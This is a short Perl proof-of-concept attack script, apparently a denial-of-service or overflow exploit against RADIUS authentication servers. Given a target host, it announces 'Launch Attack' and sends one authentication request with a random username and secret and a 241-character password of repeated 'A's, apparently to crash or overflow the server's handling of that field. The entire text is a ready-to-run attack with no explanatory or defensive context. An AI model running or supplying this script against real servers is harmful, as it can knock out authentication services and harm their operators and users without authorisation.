#!/usr/bin/perl
use Authen::Simple::RADIUS;
$|=1;
$host=shift || die "usage: $0 host\n";
print "Launch Attack ... \n";
$username=int(rand(10)).int(rand(10)).int(rand(10));
$password='A'x241;
$secret=int(rand(10)).int(rand(10)).int(rand(10));
$radius = Authen::Simple::RADIUS->new(
   host   => $host,
   secret => $secret
);
$radius->authenticate( $username, $password );
print "Finish!\n";
exit(1); 
